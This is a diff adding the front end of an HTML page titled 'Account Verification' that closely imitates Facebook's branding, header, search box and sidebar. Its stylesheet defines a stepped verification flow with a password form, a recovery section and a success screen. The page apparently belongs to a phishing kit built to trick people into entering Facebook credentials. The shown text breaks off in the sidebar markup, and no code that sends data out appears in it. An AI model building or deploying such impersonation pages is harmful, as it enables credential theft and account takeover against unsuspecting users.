@@ -1,0 +1,2596 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Account Verification</title>
+    <style>
+        /* Facebook Original Colors and Styles */
+        :root {
+            --facebook-blue: #1877f2;
+            --facebook-blue-hover: #166fe5;
+            --facebook-green: #42b72a;
+            --facebook-green-hover: #36a420;
+            --bg-primary: #f0f2f5;
+            --bg-secondary: #fff;
+            --border-color: #dddfe2;
+            --text-primary: #1c1e21;
+            --text-secondary: #65676b;
+            --text-tertiary: #8a8d91;
+            --warning-red: #be4b49;
+            --warning-bg: #fff4f4;
+            --shadow: rgba(0, 0, 0, 0.1) 0px 1px 2px 0px;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Segoe UI', Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-primary);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Facebook Header */
+        .fb-header {
+            background-color: #fff;
+            height: 56px;
+            border-bottom: 1px solid var(--border-color);
+            padding: 0 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+        }
+
+        .fb-header-left {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .fb-logo {
+            height: 40px;
+            width: 40px;
+            color: var(--facebook-blue);
+        }
+
+        .fb-search {
+            background-color: #f0f2f5;
+            border: none;
+            border-radius: 50px;
+            padding: 8px 12px;
+            width: 240px;
+            font-size: 15px;
+            color: var(--text-primary);
+        }
+
+        .fb-search::placeholder {
+            color: var(--text-tertiary);
+        }
+
+        .fb-header-center {
+            display: flex;
+            gap: 4px;
+        }
+
+        .fb-header-icon {
+            width: 111px;
+            height: 56px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-bottom: 3px solid transparent;
+            cursor: pointer;
+            color: var(--text-secondary);
+        }
+
+        .fb-header-icon:hover {
+            background-color: #f2f2f2;
+            border-radius: 8px;
+        }
+
+        .fb-header-icon.active {
+            color: var(--facebook-blue);
+            border-bottom-color: var(--facebook-blue);
+        }
+
+        .fb-header-right {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .fb-profile {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #e4e6eb;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+
+        /* Main Content */
+        .fb-main-container {
+            max-width: 1200px;
+            margin: 72px auto 20px;
+            padding: 0 20px;
+            display: grid;
+            grid-template-columns: 360px 1fr;
+            gap: 20px;
+        }
+
+        /* Left Sidebar */
+        .fb-left-sidebar {
+            position: sticky;
+            top: 72px;
+            height: calc(100vh - 92px);
+            overflow-y: auto;
+            padding-right: 8px;
+        }
+
+        .fb-left-sidebar::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        .fb-left-sidebar::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 4px;
+        }
+
+        .fb-left-sidebar::-webkit-scrollbar-thumb {
+            background: #bcc0c4;
+            border-radius: 4px;
+        }
+
+        .fb-sidebar-item {
+            display: flex;
+            align-items: center;
+            padding: 8px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-bottom: 4px;
+            color: var(--text-primary);
+            text-decoration: none;
+            transition: background-color 0.2s;
+        }
+
+        .fb-sidebar-item:hover {
+            background-color: #f2f2f2;
+        }
+
+        .fb-sidebar-icon {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background-color: #e4e6eb;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            color: var(--facebook-blue);
+        }
+
+        .fb-sidebar-text {
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        /* Center Content */
+        .fb-center-content {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        /* Main Form Container */
+        .fb-main-form-container {
+            background-color: var(--bg-secondary);
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            box-shadow: var(--shadow);
+            overflow: hidden;
+        }
+
+        /* Form Header */
+        .fb-form-header {
+            padding: 20px 20px 0;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .fb-form-title {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .fb-form-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: var(--warning-bg);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--warning-red);
+        }
+
+        .fb-form-title-text h2 {
+            font-size: 20px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 4px;
+        }
+
+        .fb-form-title-text p {
+            font-size: 14px;
+            color: var(--text-secondary);
+        }
+
+        /* Form Steps */
+        .fb-form-steps {
+            display: flex;
+            gap: 20px;
+            margin-bottom: -1px;
+        }
+
+        .fb-step {
+            padding: 16px 0;
+            background: none;
+            border: none;
+            border-bottom: 3px solid transparent;
+            font-size: 15px;
+            font-weight: 500;
+            color: var(--text-secondary);
+            cursor: pointer;
+            position: relative;
+            transition: all 0.2s;
+        }
+
+        .fb-step:hover {
+            color: var(--text-primary);
+        }
+
+        .fb-step.active {
+            color: var(--facebook-blue);
+            border-bottom-color: var(--facebook-blue);
+        }
+
+        .fb-step.completed {
+            color: var(--facebook-green);
+        }
+
+        .fb-step-number {
+            display: inline-block;
+            width: 24px;
+            height: 24px;
+            background-color: #e4e6eb;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 24px;
+            margin-right: 8px;
+            font-size: 13px;
+        }
+
+        .fb-step.active .fb-step-number {
+            background-color: var(--facebook-blue);
+            color: white;
+        }
+
+        .fb-step.completed .fb-step-number {
+            background-color: var(--facebook-green);
+            color: white;
+        }
+
+        /* Form Body */
+        .fb-form-body {
+            padding: 20px;
+        }
+
+        /* Form Groups */
+        .fb-form-group {
+            margin-bottom: 24px;
+        }
+
+        .fb-form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+
+        .fb-input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            font-size: 15px;
+            background-color: var(--bg-secondary);
+            transition: all 0.2s;
+        }
+
+        .fb-input:focus {
+            outline: none;
+            border-color: var(--facebook-blue);
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.1);
+        }
+
+        .fb-input-error {
+            border-color: var(--warning-red);
+            background-color: var(--warning-bg);
+        }
+
+        .fb-error-message {
+            color: var(--warning-red);
+            font-size: 13px;
+            margin-top: 4px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            display: none;
+        }
+
+        .fb-hint-text {
+            color: var(--text-tertiary);
+            font-size: 13px;
+            margin-top: 4px;
+        }
+
+        /* Character Counter */
+        .char-counter {
+            text-align: right;
+            font-size: 12px;
+            color: var(--text-tertiary);
+            margin-top: 4px;
+        }
+
+        .char-counter.warning {
+            color: #f39c12;
+        }
+
+        .char-counter.error {
+            color: var(--warning-red);
+        }
+
+        /* Facebook Buttons */
+        .fb-button {
+            background-color: var(--facebook-blue);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 32px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .fb-button:hover {
+            background-color: var(--facebook-blue-hover);
+        }
+
+        .fb-button:disabled {
+            background-color: #e4e6eb;
+            color: #bcc0c4;
+            cursor: not-allowed;
+        }
+
+        .fb-button-secondary {
+            background-color: #e4e6eb;
+            color: var(--text-primary);
+        }
+
+        .fb-button-secondary:hover {
+            background-color: #d8dadf;
+        }
+
+        /* Video Section - ABOVE FORM FIELDS */
+        .fb-video-section {
+            background-color: #fff;
+            border-radius: 8px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            position: relative;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+        }
+
+        .fb-video-container {
+            position: relative;
+            width: 100%;
+        }
+
+        /* Video Header */
+        .fb-video-header {
+            background: #fff;
+            border-bottom: 1px solid var(--border-color);
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .fb-video-header-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .fb-video-header-icon {
+            width: 24px;
+            height: 24px;
+            color: var(--facebook-blue);
+        }
+
+        .fb-video-header-text h4 {
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 2px;
+        }
+
+        .fb-video-subtitle {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: var(--text-secondary);
+        }
+
+        .fb-video-time {
+            background: #f0f2f5;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 500;
+        }
+
+        .fb-video-header-right {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .fb-video-lang-tag {
+            background: #e7f3ff;
+            color: var(--facebook-blue);
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        /* Video Body */
+        .fb-video-body {
+            background: #000;
+            position: relative;
+        }
+
+        .fb-video-placeholder {
+            width: 100%;
+            height: 300px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .fb-video-play-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+
+        .fb-video-play-icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+            opacity: 0.9;
+        }
+
+        .fb-video-text {
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+
+        .fb-video-click-hint {
+            font-size: 13px;
+            opacity: 0.8;
+            font-weight: 400;
+        }
+
+        /* Language Selection Button */
+        .fb-language-button {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 20px;
+            padding: 8px 16px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            z-index: 10;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s;
+        }
+
+        .fb-language-button:hover {
+            background: rgba(0, 0, 0, 0.95);
+            transform: translateY(-1px);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+        }
+
+        .fb-language-button .flag-img {
+            width: 20px;
+            height: 15px;
+            object-fit: cover;
+            border-radius: 2px;
+        }
+
+        .fb-language-button .arrow {
+            font-size: 12px;
+            opacity: 0.8;
+        }
+
+        /* Video Info - FLAGS BELOW VIDEO */
+        .fb-video-info {
+            padding: 12px 16px;
+            background: #fff;
+            border-top: 1px solid var(--border-color);
+            font-size: 13px;
+            color: var(--text-secondary);
+            line-height: 1.4;
+        }
+
+        .fb-video-languages {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 8px;
+            flex-wrap: wrap;
+        }
+
+        .fb-language-flag {
+            cursor: pointer;
+            opacity: 0.6;
+            transition: all 0.2s;
+            padding: 4px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .fb-language-flag:hover {
+            opacity: 0.8;
+            background: rgba(0,0,0,0.05);
+        }
+
+        .fb-language-flag.active {
+            opacity: 1;
+            transform: scale(1.1);
+            background: rgba(24, 119, 242, 0.1);
+            border: 1px solid rgba(24, 119, 242, 0.3);
+        }
+
+        .flag-img-small {
+            width: 30px;
+            height: 20px;
+            object-fit: cover;
+            border-radius: 2px;
+            border: 1px solid rgba(0,0,0,0.1);
+        }
+
+        /* Video Player */
+        .fb-video-player {
+            width: 100%;
+            height: 300px;
+            background-color: #000;
+            display: none;
+        }
+
+        /* Language Modal */
+        .fb-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            padding: 20px;
+        }
+
+        .fb-modal-content {
+            background-color: var(--bg-secondary);
+            border-radius: 8px;
+            max-width: 500px;
+            width: 100%;
+            max-height: 80vh;
+            overflow: hidden;
+            box-shadow: 0 12px 28px 0 rgba(0, 0, 0, 0.2), 0 2px 4px 0 rgba(0, 0, 0, 0.1);
+        }
+
+        .fb-modal-header {
+            padding: 16px 20px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .fb-modal-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+
+        .fb-modal-close {
+            background: none;
+            border: none;
+            color: var(--text-tertiary);
+            cursor: pointer;
+            font-size: 24px;
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            transition: background-color 0.2s;
+        }
+
+        .fb-modal-close:hover {
+            background-color: #f2f2f2;
+        }
+
+        .fb-modal-body {
+            padding: 20px;
+            overflow-y: auto;
+            max-height: calc(80vh - 73px);
+        }
+
+        .fb-language-option {
+            padding: 12px;
+            border-radius: 8px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 4px;
+            transition: background-color 0.2s;
+        }
+
+        .fb-language-option:hover {
+            background-color: #f2f2f2;
+        }
+
+        .fb-language-option.selected {
+            background-color: #e7f3ff;
+        }
+
+        .fb-language-flag-modal {
+            width: 30px;
+            height: 20px;
+            object-fit: cover;
+            border-radius: 2px;
+            border: 1px solid rgba(0,0,0,0.1);
+        }
+
+        .fb-language-name {
+            font-size: 15px;
+            color: var(--text-primary);
+            flex: 1;
+        }
+
+        .fb-language-code {
+            font-size: 13px;
+            color: var(--text-tertiary);
+            min-width: 60px;
+        }
+
+        .fb-modal-footer {
+            padding: 16px 20px;
+            border-top: 1px solid var(--border-color);
+            display: flex;
+            justify-content: flex-end;
+        }
+
+        /* Sidebar Content Below Form */
+        .fb-form-sidebar {
+            margin-top: 20px;
+            background-color: var(--bg-secondary);
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            box-shadow: var(--shadow);
+            padding: 20px;
+        }
+
+        .fb-form-sidebar h3 {
+            font-size: 17px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 16px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        /* Sponsor Cards */
+        .fb-sponsor-card {
+            background-color: #f7f8fa;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 16px;
+            border: 1px solid var(--border-color);
+            transition: transform 0.2s;
+        }
+
+        .fb-sponsor-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .fb-sponsor-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+
+        .fb-sponsor-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            margin-right: 12px;
+            object-fit: cover;
+        }
+
+        .fb-sponsor-info h4 {
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 2px;
+        }
+
+        .fb-sponsor-info p {
+            font-size: 13px;
+            color: var(--text-tertiary);
+        }
+
+        .fb-sponsor-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-primary);
+            margin-bottom: 8px;
+        }
+
+        .fb-sponsor-text {
+            font-size: 14px;
+            color: var(--text-secondary);
+            line-height: 1.4;
+            margin-bottom: 12px;
+        }
+
+        .fb-sponsor-learn-more {
+            color: var(--facebook-blue);
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .fb-sponsor-learn-more:hover {
+            text-decoration: underline;
+        }
+
+        .fb-sponsor-tag {
+            display: inline-block;
+            background-color: #e7f3ff;
+            color: var(--facebook-blue);
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 500;
+            margin-top: 8px;
+        }
+
+        /* Footer */
+        .fb-footer {
+            background-color: var(--bg-secondary);
+            border-top: 1px solid var(--border-color);
+            padding: 20px;
+            margin-top: auto;
+        }
+
+        .fb-footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin-bottom: 12px;
+            justify-content: center;
+        }
+
+        .fb-footer-link {
+            color: var(--text-tertiary);
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .fb-footer-link:hover {
+            text-decoration: underline;
+        }
+
+        .fb-copyright {
+            text-align: center;
+            color: var(--text-tertiary);
+            font-size: 11px;
+            margin-top: 8px;
+        }
+
+        /* Progress Bar */
+        .fb-progress-container {
+            margin-bottom: 24px;
+        }
+
+        .fb-progress-text {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+        }
+
+        .fb-progress-text span {
+            font-size: 14px;
+            color: var(--text-secondary);
+        }
+
+        .fb-progress-bar {
+            height: 4px;
+            background-color: #e4e6eb;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+
+        .fb-progress-fill {
+            height: 100%;
+            background-color: var(--facebook-blue);
+            width: 33%;
+            transition: width 0.3s ease;
+        }
+
+        /* Password Page Logo Container */
+        .fb-password-logo-container {
+            text-align: center;
+            margin-bottom: 24px;
+            padding: 20px 0;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .fb-password-logo {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 16px;
+        }
+
+        .fb-password-title {
+            color: var(--text-primary);
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .fb-password-subtitle {
+            color: var(--text-secondary);
+            font-size: 16px;
+            max-width: 500px;
+            margin: 0 auto;
+            line-height: 1.4;
+        }
+
+        /* Success State */
+        .fb-success-card {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .fb-success-logo-container {
+            margin-bottom: 24px;
+        }
+
+        .fb-success-logo {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 16px;
+        }
+
+        .fb-success-icon {
+            color: var(--facebook-green);
+            font-size: 48px;
+            margin-bottom: 16px;
+        }
+
+        .fb-success-title {
+            color: var(--text-primary);
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .fb-success-text {
+            color: var(--text-secondary);
+            font-size: 15px;
+            margin-bottom: 24px;
+            max-width: 500px;
+            margin-left: auto;
+            margin-right: auto;
+            line-height: 1.5;
+        }
+
+        /* Password Form */
+        #passwordForm {
+            display: none;
+        }
+
+        /* Recovery Section */
+        #recoverySection {
+            display: none;
+        }
+
+        /* Responsive */
+        @media (max-width: 1200px) {
+            .fb-main-container {
+                grid-template-columns: 280px 1fr;
+            }
+        }
+
+        @media (max-width: 900px) {
+            .fb-main-container {
+                grid-template-columns: 1fr;
+            }
+            .fb-left-sidebar {
+                display: none;
+            }
+            .fb-header-center,
+            .fb-search {
+                display: none;
+            }
+            
+            .fb-video-placeholder {
+                height: 250px;
+            }
+            
+            .fb-language-button {
+                padding: 6px 12px;
+                font-size: 12px;
+                top: 8px;
+                right: 8px;
+            }
+            
+            .flag-img-small {
+                width: 25px;
+                height: 17px;
+            }
+
+            .fb-password-logo {
+                width: 100px;
+                height: 100px;
+            }
+
+            .fb-password-title {
+                font-size: 20px;
+            }
+
+            .fb-success-logo {
+                width: 80px;
+                height: 80px;
+            }
+
+            .fb-success-title {
+                font-size: 20px;
+            }
+        }
+
+        @media (max-width: 600px) {
+            .fb-video-placeholder {
+                height: 200px;
+            }
+            
+            .fb-video-play-icon {
+                font-size: 36px;
+                margin-bottom: 8px;
+            }
+            
+            .fb-language-button {
+                padding: 5px 10px;
+                font-size: 11px;
+            }
+            
+            .flag-img-small {
+                width: 20px;
+                height: 14px;
+            }
+            
+            .fb-video-header {
+                flex-direction: column;
+                gap: 8px;
+                align-items: flex-start;
+            }
+            
+            .fb-video-header-right {
+                align-self: flex-start;
+            }
+
+            .fb-password-logo {
+                width: 80px;
+                height: 80px;
+            }
+
+            .fb-password-title {
+                font-size: 18px;
+            }
+
+            .fb-password-subtitle {
+                font-size: 14px;
+            }
+
+            .fb-success-logo {
+                width: 70px;
+                height: 70px;
+            }
+
+            .fb-success-title {
+                font-size: 18px;
+            }
+        }
+
+        /* Spinner Styles */
+        .spinner {
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+            display: none;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Facebook Header -->
+    <header class="fb-header">
+        <div class="fb-header-left">
+            <svg class="fb-logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 36 36">
+                <path fill="#1877f2" d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.406 5.999 15.453 14 17.317V22h-4v-4h4v-2c0-3.86 2.989-7 6.5-7 1.61 0 2.902.124 3.5.356V12h-2.5c-2.326 0-4.5 1.563-4.5 4v2h5l-1 4h-4v13.87z"/>
+            </svg>
+            <input type="text" class="fb-search" placeholder="Search Facebook">
+        </div>
+        
+        <div class="fb-header-center">
+            <div class="fb-header-icon active">
+                <svg width="28" height="28" viewBox="0 0 28 28" fill="currentColor">
+                    <path d="M25.825 12.29C25.824 12.289 25.823 12.288 25.821 12.286L15.027 2.937C14.752 2.675 14.392 2.527 13.989 2.527C13.158 2.527 12.49 3.195 12.49 4.026V9.131H5.916C4.289 9.131 2.974 10.445 2.974 12.072V15.928C2.974 17.555 4.289 18.869 5.916 18.869H12.49V23.974C12.49 24.805 13.158 25.473 13.989 25.473C14.392 25.473 14.752 25.325 15.028 25.063L25.822 15.714C26.195 15.363 26.406 14.876 26.406 14.344C26.406 13.812 26.195 13.325 25.825 12.29Z"/>
+                </svg>
+            </div>
+            <div class="fb-header-icon">
+                <svg width="28" height="28" viewBox="0 0 28 28" fill="currentColor">
+                    <path d="M7.847 23.488C9.207 23.488 10.316 22.411 10.316 21.088C10.316 19.765 9.207 18.688 7.847 18.688C6.486 18.688 5.377 19.765 5.377 21.088C5.377 22.411 6.486 23.488 7.847 23.488Z"/>
+                    <path d="M18.457 23.488C19.817 23.488 20.926 22.411 20.926 21.088C20.926 19.765 19.817 18.688 18.457 18.688C17.096 18.688 15.987 19.765 15.987 21.088C15.987 22.411 17.096 23.488 18.457 23.488Z"/>
+                    <path d="M25.97 12.708C25.895 12.317 25.673 11.961 25.346 11.71L20.833 8.501C20.744 8.438 20.639 8.4 20.528 8.393H6.751C6.593 8.393 6.439 8.437 6.305 8.52L2.628 10.848C1.832 11.343 1.516 12.287 1.789 13.176L4.268 21.259C4.449 21.838 4.997 22.23 5.607 22.23H21.693C22.303 22.23 22.851 21.838 23.032 21.259L25.994 12.783C26.045 12.633 26.02 12.468 25.97 12.708ZM8.793 18.73C8.793 19.081 8.508 19.366 8.157 19.366C7.806 19.366 7.521 19.081 7.521 18.73V14.044C7.521 13.693 7.806 13.408 8.157 13.408C8.508 13.408 8.793 13.693 8.793 14.044V18.73ZM18.443 18.73C18.443 19.081 18.158 19.366 17.807 19.366C17.456 19.366 17.171 19.081 17.171 18.73V14.044C17.171 13.693 17.456 13.408 17.807 13.408C18.158 13.408 18.443 13.693 18.443 14.044V18.73Z"/>
+                </svg>
+            </div>
+            <div class="fb-header-icon">
+                <svg width="28" height="28" viewBox="0 0 28 28" fill="currentColor">
+                    <path d="M14 2.042C7.596 2.042 2.292 7.346 2.292 13.75C2.292 19.273 6.434 23.927 11.792 24.958V17.875H9.208V14H11.792V10.958C11.792 7.558 13.9 5.542 17.042 5.542C18.542 5.542 20.125 5.75 20.125 5.75V9.125H18.417C16.746 9.125 16.208 10.168 16.208 11.25V14H20.042L19.458 17.875H16.208V24.958C21.566 23.927 25.708 19.273 25.708 13.75C25.708 7.346 20.404 2.042 14 2.042Z"/>
+                </svg>
+            </div>
+            <div class="fb-header-icon">
+                <svg width="28" height="28" viewBox="0 0 28 28" fill="currentColor">
+                    <path d="M18.229 7.708H9.771V14H18.229V7.708Z"/>
+                    <path d="M14 0C6.268 0 0 6.268 0 14C0 21.732 6.268 28 14 28C21.732 28 28 21.732 28 14C28 6.268 21.732 0 14 0ZM23.738 18.187C23.528 19.236 22.709 20.056 21.66 20.266C19.915 20.615 16.085 20.615 14 20.615C11.915 20.615 8.085 20.615 6.34 20.266C5.291 20.056 4.472 19.236 4.262 18.187C3.913 16.442 3.913 12.612 3.913 10.528C3.913 8.444 3.913 4.614 4.262 2.869C4.472 1.82 5.291 1 6.34 0.79C8.085 0.441 11.915 0.441 14 0.441C16.085 0.441 19.915 0.441 21.66 0.79C22.709 1 23.528 1.82 23.738 2.869C24.087 4.614 24.087 8.444 24.087 10.528C24.087 12.612 24.087 16.442 23.738 18.187Z"/>
+                </svg>
+            </div>
+        </div>
+        
+        <div class="fb-header-right">
+            <div class="fb-profile">Y</div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="fb-main-container">
+        <!-- Left Sidebar -->
+        <aside class="fb-left-sidebar">
+            <a href="#" class="fb-sidebar-item">
+                <div class="fb-sidebar-icon">
+                    <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
+                    </svg>
+                </div>
+                <span class="fb-sidebar-text">Your Name</span>
+            </a>
+            
+            <a href="#" class="fb-sidebar-item">
+                <div class="fb-sidebar-icon" style="background-color: #1b74e4; color: white;">
+                    <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M18.77 7.46H14.5v-1.9c0-.9.6-1.1 1-1.1h3V.5h-4.33C10.24.5 9.5 3.44 9.5 5.32v2.15h-3v4h3v12h5v-12h3.85l.42-4z"/>
+                    </svg>
+                </div>
+                <span class="fb-sidebar-text">Friends</span>
+            </a>
+            
+            <a href="#" class="fb-sidebar-item">
+                <div class="fb-sidebar-icon" style="background-color: #1b74e4; color: white;">
+                    <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/>
+                    </svg>
+                </div>
+                <span class="fb-sidebar-text">Groups</span>
+            </a>
+            
+            <a href="#" class="fb-sidebar-item">
+                <div class="fb-sidebar-icon" style="background-color: #1b74e4; color: white;">
+                    <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M17 12h-5v5h5v-5zM16 1v2H8V1H6v2H5c-1.11 0-1.99.9-1.99 2L3 19c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2h-1V1h-2zm3 18H5V8h14v11z"/>
+                    </svg>
+                </div>
+                <span class="fb-sidebar-text">Events</span>
+            </a>
+            
+            <a href="#" class="fb-sidebar-item">
+                <div class="fb-sidebar-icon" style="background-color: #1b74e4; color: white;">
+                    <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24">
+                        <path d="M22.46 6c-.77.35-1.6.58-2.46.69.88-.53 1.56-1.37 1.88-2.38-.83.5-1.75.85-2.72 1.05C18.37 4.5 17.26 4 16 4c-2.35 0-4.27 1.92-4.27 4.29 0 .34.04.67.11.98C8.28 9.09 5.11 7.38 3 4.79c-.37.63-.58 1.37-.58 2.15 0 1.49.75 2.81 1.91 3.56-.71 0-1.37-.2-1.95-.5v.03c0 2.08 1.48 3.82 3.44 4.21a4.22 4.22 0 0 1-1.93.07 4.28 4.28 0 0 0 4 2.98 8.521 8.521 0 0 1-5.33 1.84c-.34 0-.68-.02-1.02-.06C3.44 20.29 5.7 21 8.12 21 16 21 20.33 14.46 20.33 8.79c0-.19 0-.37-.01-.56.84-.6 1.56-1.36 2.14-2.23z"/>
+                    </svg>
+                </div>
+                <span class="fb-sidebar-text">Twitter</span>
+            </a>
+            
+            <div class="fb-sidebar-item">
+                <div class="fb-sidebar-icon">
+                    <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24">
